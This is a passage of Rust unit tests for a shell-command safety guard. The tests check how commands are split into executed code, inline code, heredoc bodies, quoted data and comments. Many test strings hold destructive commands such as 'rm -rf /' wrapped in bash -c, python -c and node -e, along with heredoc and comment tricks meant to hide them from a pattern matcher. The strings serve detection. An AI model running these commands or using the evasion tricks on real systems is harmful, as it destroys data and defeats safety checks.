            assert!(is_inline_code_flag(word), "{word:?} is an inline-code flag");
        }
    }

    #[test]
    fn test_bash_c_single_quote_inline_code() {
        let cmd = "bash -c 'rm -rf /'";
        let spans = classify_command(cmd);

        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(
            inline_span.is_some(),
            "Should detect inline code after bash -c with single quotes"
        );
    }

    #[test]
    fn test_bash_c_attached_single_quote_inline_code() {
        let cmd = "bash -c'rm -rf /'";
        let spans = classify_command(cmd);

        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(
            inline_span.is_some(),
            "Should detect inline code after bash -c without space"
        );
    }

    #[test]
    fn test_bash_lc_inline_code() {
        let cmd = "bash -lc \"rm -rf /\"";
        let spans = classify_command(cmd);

        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(
            inline_span.is_some(),
            "Should detect inline code after bash -lc"
        );
    }

    #[test]
    fn test_bash_lc_attached_single_quote_inline_code() {
        let cmd = "bash -lc'echo rm -rf /'";
        let spans = classify_command(cmd);

        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(
            inline_span.is_some(),
            "Should detect inline code after bash -lc without space"
        );
    }

    #[test]
    fn test_python_c_inline_code() {
        let cmd = "python -c \"import os; os.system('rm -rf /')\"";
        let spans = classify_command(cmd);

        // The quoted part after -c should be InlineCode
        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(
            inline_span.is_some(),
            "Should detect inline code after python -c"
        );
    }

    #[test]
    fn test_node_e_inline_code() {
        let cmd = "node -e \"require('child_process').execSync('rm -rf /')\"";
        let spans = classify_command(cmd);

        // The quoted part after -e should be InlineCode
        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(
            inline_span.is_some(),
            "Should detect inline code after node -e"
        );
    }

    #[test]
    fn test_double_quote_with_substitution() {
        let cmd = "echo \"$(rm -rf /)\"";
        let spans = classify_command(cmd);

        // Should be Unknown or InlineCode (not safe Argument)
        for span in spans.spans() {
            if span.text(cmd).contains("$(") {
                assert!(
                    span.kind == SpanKind::Unknown || span.kind == SpanKind::InlineCode,
                    "Double-quoted string with substitution should not be safe Argument"
                );
            }
        }
    }

    #[test]
    fn test_escaped_quote() {
        let cmd = "echo \"hello \\\"world\\\"\"";
        let spans = classify_command(cmd);

        // Should handle escaped quotes correctly
        assert!(!spans.spans().is_empty());
    }

    #[test]
    fn test_false_positive_case_bd_create() {
        // This should NOT trigger destructive pattern matching
        let cmd = "bd create --description=\"This pattern blocks rm -rf\"";
        let spans = classify_command(cmd);

        // The quoted description should be Argument (not requiring pattern check)
        let desc_span = spans
            .spans()
            .iter()
            .find(|s| s.text(cmd).contains("rm -rf"));
        if let Some(span) = desc_span {
            assert!(
                !span.kind.requires_pattern_check() || span.kind == SpanKind::Argument,
                "Description argument should not require pattern check"
            );
        }
    }

    #[test]
    fn test_false_positive_case_git_commit() {
        // This should NOT trigger destructive pattern matching
        let cmd = "git commit -m \"Fix git reset --hard detection\"";
        let spans = classify_command(cmd);

        // The quoted message should be Argument
        let msg_span = spans
            .spans()
            .iter()
            .find(|s| s.text(cmd).contains("reset --hard"));
        if let Some(span) = msg_span {
            assert_eq!(span.kind, SpanKind::Argument);
        }
    }

    #[test]
    fn test_false_positive_case_rg_pattern() {
        // This should NOT trigger destructive pattern matching
        let cmd = "rg -n \"rm -rf\" src/main.rs";
        let spans = classify_command(cmd);

        // The quoted pattern should be Argument
        let pattern_span = spans.spans().iter().find(|s| s.text(cmd) == "\"rm -rf\"");
        if let Some(span) = pattern_span {
            assert_eq!(span.kind, SpanKind::Argument);
        }
    }

    #[test]
    fn test_span_kind_requires_pattern_check() {
        assert!(SpanKind::Executed.requires_pattern_check());
        assert!(SpanKind::InlineCode.requires_pattern_check());
        assert!(SpanKind::HeredocBody.requires_pattern_check());
        assert!(SpanKind::Unknown.requires_pattern_check());
        assert!(!SpanKind::Data.requires_pattern_check());
        assert!(!SpanKind::Argument.requires_pattern_check());
    }

    #[test]
    fn test_span_kind_is_safe_data() {
        assert!(SpanKind::Data.is_safe_data());
        assert!(!SpanKind::Argument.is_safe_data());
        assert!(!SpanKind::Executed.is_safe_data());
    }

    #[test]
    fn test_empty_command() {
        let spans = classify_command("");
        assert!(spans.spans().is_empty());
    }

    #[test]
    fn test_whitespace_only() {
        let spans = classify_command("   ");
        // Should have one Executed span (conservative)
        assert!(!spans.spans().is_empty());
    }

    #[test]
    fn test_nested_command_substitution() {
        let cmd = "echo $(echo $(rm -rf /))";
        let spans = classify_command(cmd);

        // Should detect the outer command substitution as InlineCode
        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(inline_span.is_some());
    }

    #[test]
    fn test_nested_command_substitution_parens() {
        // Test nested parentheses inside command substitution
        let cmd = "echo $( ( echo inner ) )";
        let spans = classify_command(cmd);

        // Should include the nested parens in the InlineCode span
        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(inline_span.is_some());
        assert_eq!(inline_span.unwrap().text(cmd), "$( ( echo inner ) )");
    }

    #[test]
    fn test_command_substitution_with_comment() {
        // Test that parentheses inside comments are ignored
        let cmd = "echo $(echo # ) \n)";
        let spans = classify_command(cmd);

        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(inline_span.is_some());
        assert_eq!(inline_span.unwrap().text(cmd), "$(echo # ) \n)");
    }

    #[test]
    fn test_single_quote_preserves_special_chars() {
        let cmd = "echo '$HOME'";
        let spans = classify_command(cmd);

        // '$HOME' should be Data (single quotes prevent expansion)
        let data_span = spans.spans().iter().find(|s| s.kind == SpanKind::Data);
        assert!(data_span.is_some());
        assert_eq!(data_span.unwrap().text(cmd), "'$HOME'");
    }

    #[test]
    fn test_mixed_quotes() {
        let cmd = "echo 'single' \"double\" plain";
        let spans = classify_command(cmd);

        // Should have at least 3 distinct spans
        let data_count = spans
            .spans()
            .iter()
            .filter(|s| s.kind == SpanKind::Data)
            .count();
        let arg_count = spans
            .spans()
            .iter()
            .filter(|s| s.kind == SpanKind::Argument)
            .count();

        assert!(data_count >= 1, "Should have single-quoted Data span");
        assert!(arg_count >= 1, "Should have double-quoted Argument span");
    }

    #[test]
    fn test_or_operator() {
        let cmd = "false || rm -rf /";
        let spans = classify_command(cmd);

        // Both parts should be executable
        assert!(spans.has_executable_content());
    }

    #[test]
    fn test_path_prefixed_command() {
        let cmd = "/usr/bin/bash -c \"rm -rf /\"";
        let spans = classify_command(cmd);

        // Should still detect inline code after path-prefixed bash
        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(
            inline_span.is_some(),
            "Should detect inline code after /usr/bin/bash -c"
        );
    }

    #[test]
    fn test_performance_typical_commands() {
        use std::time::Instant;

        // Test a variety of typical commands
        let commands = [
            "git status",
            "git commit -m 'Fix bug in parser'",
            "echo \"hello world\" | cat",
            "ls -la /tmp",
            "cargo test --release",
            "python -c \"print('hello')\"",
            "bash -c \"echo test && echo done\"",
            "docker ps --all --format '{{.Names}}'",
        ];

        // Warm up
        for cmd in &commands {
            let _ = classify_command(cmd);
        }

        // Time 1000 iterations
        let iterations = 1000;
        let start = Instant::now();
        for _ in 0..iterations {
            for cmd in &commands {
                let _ = classify_command(cmd);
            }
        }
        let elapsed = start.elapsed();

        // Calculate average per command
        let total_commands = iterations * commands.len();
        let avg_nanoseconds = elapsed.as_nanos() / total_commands as u128;
        #[allow(clippy::cast_precision_loss)]
        let avg_microseconds = avg_nanoseconds as f64 / 1000.0;

        // Assert performance is under 100μs per command
        assert!(
            avg_microseconds < 100.0,
            "Average classification time {avg_microseconds:.2}μs exceeds 100μs budget"
        );

        // Print for visibility in test output
        eprintln!(
            "Context classification performance: {avg_microseconds:.2}μs/command ({} commands, {} iterations)",
            commands.len(),
            iterations
        );
    }

    // =========================================================================
    // Safe String Registry Tests (git_safety_guard-t8x.1)
    // =========================================================================

    #[test]
    fn test_registry_echo_is_all_data() {
        // echo command - all args are data, never executed
        assert!(SAFE_STRING_REGISTRY.is_all_args_data("echo"));
        assert!(SAFE_STRING_REGISTRY.is_all_args_data("echo"));
        assert!(SAFE_STRING_REGISTRY.is_all_args_data("/bin/echo"));
        assert!(SAFE_STRING_REGISTRY.is_all_args_data("/usr/bin/echo"));
    }

    #[test]
    fn test_registry_printf_is_all_data() {
        // printf command - all args are data, never executed
        assert!(SAFE_STRING_REGISTRY.is_all_args_data("printf"));
        assert!(SAFE_STRING_REGISTRY.is_all_args_data("/usr/bin/printf"));
    }

    #[test]
    fn test_registry_bash_is_not_all_data() {
        // bash is NOT all-data - it executes code!
        assert!(!SAFE_STRING_REGISTRY.is_all_args_data("bash"));
        assert!(!SAFE_STRING_REGISTRY.is_all_args_data("sh"));
        assert!(!SAFE_STRING_REGISTRY.is_all_args_data("python"));
    }

    #[test]
    fn test_registry_git_message_flags() {
        // git -m and --message are data (commit messages)
        assert!(SAFE_STRING_REGISTRY.is_flag_data("git", "-m"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("git", "--message"));
        // But other git flags are NOT data
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("git", "-c"));
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("git", "--exec"));
    }

    #[test]
    fn test_registry_bd_description_flags() {
        // bd --description, --title, --notes, --reason are data
        assert!(SAFE_STRING_REGISTRY.is_flag_data("bd", "--description"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("bd", "--title"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("bd", "--notes"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("bd", "--reason"));
    }

    #[test]
    fn test_registry_bd_multivalue_flags() {
        assert!(SAFE_STRING_REGISTRY.is_flag_data_multivalue("bd", "--notes"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data_multivalue("bd", "--description"));
        assert!(!SAFE_STRING_REGISTRY.is_flag_data_multivalue("git", "-m"));
        assert!(!SAFE_STRING_REGISTRY.is_flag_data_multivalue("grep", "-e"));
    }

    #[test]
    fn test_registry_grep_pattern_flags() {
        // grep -e/--regexp take pattern arguments (data, not code)
        assert!(SAFE_STRING_REGISTRY.is_flag_data("grep", "-e"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("grep", "--regexp"));
        // grep -F/--fixed-strings do NOT take pattern arguments (pattern remains positional)
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("grep", "-F"));
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("grep", "--fixed-strings"));
    }

    #[test]
    fn test_registry_gh_cli_flags() {
        // gh -t, -b, -m and their long forms are data
        assert!(SAFE_STRING_REGISTRY.is_flag_data("gh", "-t"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("gh", "--title"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("gh", "-b"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("gh", "--body"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("gh", "-m"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("gh", "--message"));
    }

    #[test]
    fn test_registry_data_flags_for_git() {
        let flags = SAFE_STRING_REGISTRY.data_flags_for_command("git");
        assert!(flags.contains(&"-m"));
        assert!(flags.contains(&"--message"));
    }

    #[test]
    fn test_registry_data_flags_for_grep() {
        let flags = SAFE_STRING_REGISTRY.data_flags_for_command("grep");
        assert!(flags.contains(&"-e"));
        assert!(flags.contains(&"--regexp"));
        assert!(!flags.contains(&"-F"));
        assert!(!flags.contains(&"--fixed-strings"));
    }

    #[test]
    fn test_is_argument_data_echo() {
        // echo "rm -rf /" - the argument is data
        assert!(is_argument_data("echo \"rm -rf /\"", None));
    }

    #[test]
    fn test_is_argument_data_git_commit_message() {
        // git commit -m "..." - the -m argument is data
        assert!(is_argument_data("git commit -m \"Fix rm -rf\"", Some("-m")));
    }

    #[test]
    fn test_is_argument_data_rg_pattern() {
        // rg -e "rm -rf" - the -e argument is data
        assert!(is_argument_data("rg -e \"rm -rf\" src/", Some("-e")));
    }

    #[test]
    fn test_is_argument_data_bash_c_is_not_data() {
        // bash -c "rm -rf /" - the -c argument is CODE, not data!
        assert!(!is_argument_data("bash -c \"rm -rf /\"", Some("-c")));
    }

    #[test]
    fn test_counterexample_bash_executes() {
        // Counterexample: bash -c MUST still be treated as code
        // This test ensures we don't accidentally suppress bash -c
        assert!(!SAFE_STRING_REGISTRY.is_all_args_data("bash"));
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("bash", "-c"));
    }

    #[test]
    fn test_counterexample_python_executes() {
        // Counterexample: python -c MUST still be treated as code
        assert!(!SAFE_STRING_REGISTRY.is_all_args_data("python"));
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("python", "-c"));
    }

    #[test]
    fn test_counterexample_xargs_executes() {
        // Counterexample: xargs can execute commands
        assert!(!SAFE_STRING_REGISTRY.is_all_args_data("xargs"));
    }

    #[test]
    fn test_false_positive_git_commit_message() {
        // This should NOT trigger pattern matching on commit message
        let cmd = "git commit -m \"Fix git reset --hard detection\"";

        // Using the registry, we know -m flag args are data
        assert!(SAFE_STRING_REGISTRY.is_flag_data("git", "-m"));

        // Combined with context classification, the quoted part is Argument
        let spans = classify_command(cmd);
        let msg_span = spans
            .spans()
            .iter()
            .find(|s| s.text(cmd).contains("reset --hard"));
        assert!(msg_span.is_some());
        // The message should be classified as Argument (not requiring pattern check)
        assert_eq!(msg_span.unwrap().kind, SpanKind::Argument);
    }

    #[test]
    fn test_false_positive_rg_pattern() {
        // This should NOT trigger pattern matching on rg pattern
        let cmd = "rg -e \"rm -rf\" src/";

        // Using the registry, we know -e flag args are data
        assert!(SAFE_STRING_REGISTRY.is_flag_data("rg", "-e"));

        // The quoted pattern should be classified as Argument
        let spans = classify_command(cmd);
        let pattern_span = spans.spans().iter().find(|s| s.text(cmd) == "\"rm -rf\"");
        assert!(pattern_span.is_some());
        assert_eq!(pattern_span.unwrap().kind, SpanKind::Argument);
    }

    #[test]
    fn test_false_positive_bd_create() {
        // This should NOT trigger pattern matching on bd description
        let cmd = "bd create --description=\"This pattern blocks rm -rf\"";

        // Using the registry
        assert!(SAFE_STRING_REGISTRY.is_flag_data("bd", "--description"));

        // The description should be classified as Argument
        let spans = classify_command(cmd);
        let desc_span = spans
            .spans()
            .iter()
            .find(|s| s.text(cmd).contains("rm -rf"));
        assert!(desc_span.is_some());
        // Note: current classification treats this as Argument (attached to flag)
        assert_eq!(desc_span.unwrap().kind, SpanKind::Argument);
    }

    #[test]
    fn test_true_positive_bash_c() {
        // This MUST trigger pattern matching - bash -c is CODE!
        let cmd = "bash -c \"rm -rf /\"";

        // bash -c is NOT in the data registry
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("bash", "-c"));

        // The classifier should detect this as InlineCode
        let spans = classify_command(cmd);
        let code_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(code_span.is_some(), "bash -c content must be InlineCode");
    }

    #[test]
    fn test_true_positive_python_c() {
        // This MUST trigger pattern matching - python -c is CODE!
        let cmd = "python -c \"import os; os.system('rm -rf /')\"";

        // python -c is NOT in the data registry
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("python", "-c"));

        // The classifier should detect this as InlineCode
        let spans = classify_command(cmd);
        let code_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(code_span.is_some(), "python -c content must be InlineCode");
    }

    /// A `#` that does not start a word starts no comment: inside `${…}`
    /// (whose blanks do not end the word) or right after a carriage return or
    /// form feed (no blank to the shell). The rest of the line stays visible
    /// to both readers; a `#` that does start a word still hides its line.
    #[test]
    fn hash_inside_a_word_starts_no_comment() {
        for cmd in [
            "echo ${x:- #}; rm -rf /",
            "echo ${x:-${y} #}; rm -rf /",
            "echo ${x:-\"}\" #}; rm -rf /",
            "echo ${x:-$(echo }) #}; rm -rf /",
            "echo ${x:-$'a\\'b' #}; rm -rf /",
            "echo a\r#b; rm -rf /",
            "echo a\x0c#b; rm -rf /",
        ] {
            assert!(
                sanitize_for_pattern_matching(cmd).contains("rm -rf /"),
                "{cmd:?}"
            );
            let spans = classify_command(cmd);
            assert!(
                spans
                    .spans()
                    .iter()
                    .all(|span| span.kind != SpanKind::Comment),
                "{cmd:?}: {spans:?}"
            );
        }
        for cmd in [
            "echo ${x} # rm -rf /",
            "echo ${x:-{} # rm -rf /",
            "echo a\r\n# rm -rf /",
        ] {
            assert!(
                !sanitize_for_pattern_matching(cmd).contains("rm -rf /"),
                "{cmd:?}"
            );
            let spans = classify_command(cmd);
            assert!(
                spans
                    .spans()
                    .iter()
                    .any(|span| span.kind == SpanKind::Comment && span.text(cmd) == "# rm -rf /"),
                "{cmd:?}: {spans:?}"
            );
        }
    }

    /// The bodies, with their terminator lines, that `rules` finds.
    fn bodies(command: &str, rules: HeredocRules) -> Vec<&str> {
        heredoc_body_ranges(command, rules)
            .iter()
            .map(|body| &command[body.range.clone()])
            .collect()
    }

    /// A heredoc body ends at the first line that is exactly its delimiter
    /// after quote removal, as each shell reads bodies; operators are found
    /// wherever shell code is, and nowhere else.
    #[test]
    fn heredoc_bodies_end_at_their_terminator_lines() {
        for (command, expected) in [
            ("cat > n <<'EOF'\nit's\nEOF\nrm -rf /", vec!["it's\nEOF"]),
            ("cat <<EOF\nx\nEOF", vec!["x\nEOF"]),
            ("cat<<\"EOF\">n\nx\nEOF\nls", vec!["x\nEOF"]),
            ("cat <<\\EOF\nx\nEOF\nls", vec!["x\nEOF"]),
            ("cat <<E'O'\"F\"\nx\nEOF\nls", vec!["x\nEOF"]),
            ("cat <<'E F'\nx\nE F\nls", vec!["x\nE F"]),
            ("cat <<''\nx\n\nls", vec!["x\n"]),
            // `<<-` strips leading tabs, and only tabs; `<<` strips nothing.
            ("cat <<-EOF\n\tx\n\tEOF\nls", vec!["\tx\n\tEOF"]),
            ("cat <<-EOF\n x\n EOF\nEOF\nls", vec![" x\n EOF\nEOF"]),
            ("cat <<EOF\nx\n\tEOF\nEOF\nls", vec!["x\n\tEOF\nEOF"]),
            ("cat <<EOF\nx\nEOF \nEOF\nls", vec!["x\nEOF \nEOF"]),
            // A carriage return is part of the line, and of a delimiter word.
            ("cat <<EOF\nx\nEOF\r\nEOF\nls", vec!["x\nEOF\r\nEOF"]),
            ("cat <<'EOF'\r\nit's\r\nEOF\r\nls", vec!["it's\r\nEOF\r"]),
            // Bodies follow one another; the line after the operator's comes
            // first, whatever else is on it.
            (
                "cat <<A; cat <<'B'\na\nA\nb's\nB\nls",
                vec!["a\nA", "b's\nB"],
            ),
            ("cat <<A <<B\na\nA\nb\nB\nls", vec!["a\nA", "b\nB"]),
            ("cat <<EOF # note\nx\nEOF\nls", vec!["x\nEOF"]),
            ("cat <<EOF \\\n>/dev/null\nx\nEOF\nls", vec!["x\nEOF"]),
            // Inside substitutions, and inside a subshell that only looks
            // like arithmetic.
            ("x=$(cat <<'EOF'\nit's\nEOF\n)\nls", vec!["it's\nEOF"]),
            ("echo \"$(cat <<EOF\nit's\nEOF\n)\"\nls", vec!["it's\nEOF"]),
            ("x=`cat <<EOF\nit's\nEOF\n`\nls", vec!["it's\nEOF"]),
            ("((cat <<'EOF') )\nit's\nEOF\nls", vec!["it's\nEOF"]),
            // An operator inside a body belongs to the reading of the body.
            (
                "bash <<'O'\ncat <<I\nit's\nI\nO\nls",
                vec!["cat <<I\nit's\nI\nO"],
            ),
            // No terminator: the body runs to the end of the input.
            ("cat <<EOF\nit's\nrm -rf /", vec!["it's\nrm -rf /"]),
            // A line continuation is removed before the delimiter is read.
            ("cat <<\\\nEOF\nx\nEOF\nls", vec!["x\nEOF"]),
            ("cat <<E\\\nOF\nx\nEOF\nls", vec!["x\nEOF"]),
            ("cat <<\"E\\\nOF\"\nx\nEOF\nls", vec!["x\nEOF"]),
            // After a substitution's `)` a `#` is part of the word.
            ("echo $(echo a)#<<EOF\nx\nEOF\nls", vec!["x\nEOF"]),
            // With an unquoted delimiter a body line ending in a
            // backslash-newline goes on to the next line, which therefore
            // ends no body; with a quoted one it is a line like any other.
            (
                "cat <<EOF\nx\\\nEOF\nls\nEOF\nrm",
                vec!["x\\\nEOF\nls\nEOF"],
            ),
            ("cat <<EOF\nx\\\\\nEOF\nls", vec!["x\\\\\nEOF"]),
            ("cat <<'EOF'\nx\\\nEOF\nls\nEOF\nrm", vec!["x\\\nEOF"]),
            // Not operators.
            ("cat <<< \"it's\"\nls", vec![]),
            ("cat <<<EOF\nEOF\nls", vec![]),
            ("echo $((1 << 2))\n2\nls", vec![]),
            ("echo a # <<EOF\nEOF\nls", vec![]),
            ("echo a;#<<EOF\nEOF\nls", vec![]),
            ("(echo a)#<<EOF\nEOF\nls", vec![]),
            ("((1))#<<EOF\nEOF\nls", vec![]),
            ("cat <<#EOF\n#EOF\nls", vec![]),
            ("cat << #EOF\n#EOF\nls", vec![]),
            ("echo '<<EOF'\nEOF\nls", vec![]),
            ("echo \"<<EOF\"\nEOF\nls", vec![]),
            ("echo \\<<EOF\nEOF\nls", vec![]),
            ("cat <<\nls", vec![]),
            ("cat <<;\nls", vec![]),
        ] {
            for rules in [HeredocRules::Bash, HeredocRules::Dash] {
                assert_eq!(bodies(command, rules), expected, "{command:?} {rules:?}");
            }
        }
        // Where the shells differ: bash and zsh end an unquoted body at a
        // line joined across a backslash-newline, decode `$'…'`, and read
        // `((…))` and `$[…]` as arithmetic.
        for (command, bash, dash) in [
            ("(( x = 1 << 2 ))\n2\nls", vec![], vec!["2"]),
            ("(( x = 1 << 2 ))\nit's\n2\nls", vec![], vec!["it's\n2"]),
            ("echo $[1<<2]\nit's\n2]\nls", vec![], vec!["it's\n2]"]),
            ("echo $[a[1]<<2]\nx\n2]\nls", vec![], vec!["x\n2]"]),
            (
                "cat <<EOF\nE\\\nOF\nls\nEOF\nrm",
                vec!["E\\\nOF"],
                vec!["E\\\nOF\nls\nEOF"],
            ),
            (
                "cat <<$'EOF'\nx\nEOF\n$EOF\nrm",
                vec!["x\nEOF"],
                vec!["x\nEOF\n$EOF"],
            ),
        ] {
            assert_eq!(bodies(command, HeredocRules::Bash), bash, "{command:?}");
            assert_eq!(bodies(command, HeredocRules::Dash), dash, "{command:?}");
        }
        let nested = heredoc_body_ranges(
            "x=$(cat <<EOF\na\nEOF\n)\ncat <<B\nb\nB",
            HeredocRules::Bash,
        );
        assert_eq!(
            nested.iter().map(|body| body.top_level).collect::<Vec<_>>(),
            [false, true]
        );
    }

    /// A quote, substitution or expansion left open in a heredoc body ends
    /// with the body: the commands after its terminator line stay visible to
    /// the sanitizer and are no quoted data to the classifier.
    #[test]
    fn a_heredoc_body_hides_nothing_after_its_terminator() {
        let tail = "rm -rf /";
        for body in [
            "echo it's",
            "it's",
            "We don't need this.",
            "say \"hi",
            "run `make",
            "value $(date",
            "path ${HOME",
            "# it's a note",
            "line one's\nline two",
        ] {
            for (opener, terminator) in [
                ("cat > notes.md <<'EOF'", "EOF"),
                ("cat > notes.md <<\"EOF\"", "EOF"),
                ("cat > notes.md <<EOF", "EOF"),
                ("cat <<'EOF' > notes.md", "EOF"),
                ("tee notes.md <<'EOF' >/dev/null", "EOF"),
                ("cat>notes.md<<'EOF'", "EOF"),
                ("cat <<'EOF' | grep x", "EOF"),
                ("cat > notes.md <<-'EOF'", "\tEOF"),
                ("cat >a <<'A'; cat >b <<'B'\nx's\nA", "B"),
            ] {
                let command = format!("{opener}\n{body}\n{terminator}\n{tail}");
                let sanitized = sanitize_for_pattern_matching(&command);
                assert!(sanitized.contains(tail), "{command:?} -> {sanitized:?}");
                let at = command.rfind(tail).expect("tail");
                assert!(
                    !offset_is_quoted_data(&command, at),
                    "{command:?}: {:?}",
                    classify_command(&command)
                );
                assert!(
                    classify_command(&command)
                        .spans()
                        .iter()
                        .all(|span| !(span.kind == SpanKind::Comment
                            && span.byte_range.contains(&at))),
                    "{command:?}"
                );
            }
        }
        // Inside a substitution, and with the delimiter quoted on CRLF lines.
        for command in [
            "x=$(cat <<'EOF'\nit's\nEOF\n)\ngit commit -m 'done'\nrm -rf /",
            "cat > notes.md <<'EOF'\r\nit's\r\nEOF\r\nrm -rf /",
        ] {
            let at = command.rfind(tail).expect("tail");
            assert!(!offset_is_quoted_data(command, at), "{command:?}");
            assert!(
                sanitize_for_pattern_matching(command).contains(tail),
                "{command:?}"
            );
        }
        // What a body holds is still masked as before: an `echo` line's
        // arguments, and a comment line.
        for command in [
            "cat > notes.md <<'EOF'\necho rm -rf /\nEOF\nls",
            "cat > notes.md <<'EOF'\n# rm -rf /\nEOF\nls",
            "bash <<'EOF'\necho 'rm -rf / is bad'\nEOF",
        ] {
            assert!(
                !sanitize_for_pattern_matching(command).contains(tail),
                "{command:?}"
            );
        }
    }

    /// Where the shells disagree on where a body ends, the text after it that
    /// any of them runs stays visible. Read under the other shell's rules, the
    /// body ends early or late and an apostrophe in it hides that text, as it
    /// does in the reading whole.
    #[test]
    fn a_disputed_heredoc_body_hides_nothing_any_shell_runs() {
        let tail = "rm -rf /";
        for command in [
            // bash and zsh end the body at `E\` joined with `OF`; dash reads
            // on to the next `EOF`.
            "cat <<EOF\nE\\\nOF\necho it's\nEOF\nrm -rf /",
            // dash keeps the `$` of `$'EOF'` and reads on to `$EOF`; bash and
            // zsh end the body at `EOF`.
            "cat <<$'EOF'\nEOF\necho it's\n$EOF\nrm -rf /",
            // dash reads `((` as two subshells and `$[` as a word, and the
            // `<<` in them as an operator; bash and zsh read arithmetic.
            "(( x = 1 << 2 ))\necho it's\n2\nrm -rf /",
            "echo $[1<<2]\necho it's\n2]\nrm -rf /",
        ] {
            assert!(
                sanitize_for_pattern_matching(command).contains(tail),
                "{command:?}"
            );
        }
        for command in [
            "cat <<EOF\nE\\\nOF\nit's\nEOF\nrm -rf /\necho 'done'",
            "cat <<$'EOF'\nEOF\nit's\n$EOF\nrm -rf /\necho 'done'",
            "(( x = 1 << 2 ))\nit's\n2\nrm -rf /\necho 'done'",
        ] {
            let at = command.rfind(tail).expect("tail");
            assert!(!offset_is_quoted_data(command, at), "{command:?}");
        }
    }

    /// Bodies nested in bodies that bash and dash end at different lines are
    /// read once for each reading of their containers, which doubles the
    /// work at every level. Past their budget the readers stop and trust no
    /// reading: every byte is checked, and only the quotes and expansion
    /// openers in body text are masked, so that no later tokenizer takes the
    /// commands after a body for its contents, while the rest of the body's
    /// syntax stays for the patterns that read it. They never run long, and
    /// never hide what follows.
    #[test]
    fn nested_disputed_heredoc_bodies_stay_within_the_reading_budget() {
        use std::fmt::Write as _;
        const LEVELS: usize = 40;
        let mut command = String::new();
        for level in 0..LEVELS {
            let _ = writeln!(command, "cat <<$'L{level}'");
        }
        command.push_str("echo it's $(date) ${HOME} <(ls)\nbuild() { make \\\n -j2; } # done\n");
        for level in (0..LEVELS).rev() {
            let _ = writeln!(command, "L{level}\n$L{level}");
        }
        command.push_str("rm -rf /");
        let started = std::time::Instant::now();
        let sanitized = sanitize_for_pattern_matching(&command);
        assert!(sanitized.contains("rm -rf /"));
        assert!(
            sanitized
                .contains("echo it s  (date)  {HOME} < ls)\nbuild() { make \\\n -j2; } # done\n"),
            "{sanitized:?}"
        );
        assert!(
            sanitized.starts_with("cat <<$'L0'\ncat <<$ L1 \n"),
            "{sanitized:?}"
        );
        assert_eq!(sanitized.len(), command.len());
        let at = command.rfind("rm -rf /").expect("tail");
        assert!(!offset_is_quoted_data(&command, at));
        assert!(
            started.elapsed() < std::time::Duration::from_secs(10),
            "the readers took {:?}",
            started.elapsed()
        );
        // The budget is spent by length: an ordinary command, a few readings
        // of its length, is far inside it.
        let mut budget = HeredocReadBudget::for_command(&command);
        assert!(sanitize_mask_ranges(&command, 0, &mut budget).is_none());
        let ordinary = "cat > notes.md <<'EOF'\necho it's\nEOF\necho 'done'\nrm -rf /";
        let mut budget = HeredocReadBudget::for_command(ordinary);
        let masked = sanitize_mask_ranges(ordinary, 0, &mut budget).expect("within budget");
        assert!(!masked.is_empty());
        assert!(budget.left > HeredocReadBudget::SLACK);
    }

    /// The parse view writes each terminator bash finds by joining lines out
    /// joined, keeping the command's length and every byte outside it; any
    /// other command is passed through as it is.
    #[test]
    fn the_parse_view_writes_a_joined_terminator_out_joined() {
        let command = "cat <<EOF >n\nE\\\nOF\nrm -rf ~\nEOF";
        let view = shell_parse_source(command);
        assert_eq!(view, "cat <<EOF >n\nEOF\n\n\nrm -rf ~\nEOF");
        let at = command.find("rm").expect("rm");
        assert_eq!(&view[at..], &command[at..]);
        assert_eq!(
            shell_parse_source("cat <<EOF\nE\\\nO\\\nF\nls"),
            "cat <<EOF\nEOF\n\n\n\n\nls"
        );
        assert_eq!(
            shell_parse_source("cat <<-EOF\n\tE\\\nOF\nls"),
            "cat <<-EOF\n\tEOF\n\n\nls"
        );
        for command in [
            "cat <<'EOF' >n\nE\\\nOF\nrm -rf ~\nEOF",
            "cat <<EOF >n\nx\\\nEOF\nrm -rf ~\nEOF",
            "echo a \\\n b",
            "cat <<EOF\nx\nEOF",
        ] {
            assert!(
                matches!(shell_parse_source(command), Cow::Borrowed(_)),
                "{command:?}"
            );
        }
    }

    /// The text every rule set reads as a body: where bash and dash end a
    /// body at different lines, only the part they share.
    #[test]
    fn undisputed_body_text_is_what_every_shell_reads_as_a_body() {
        let text = |command: &'static str| -> Vec<&'static str> {
            undisputed_heredoc_body_ranges(command)
                .into_iter()
                .map(|range| &command[range])
                .collect()
        };
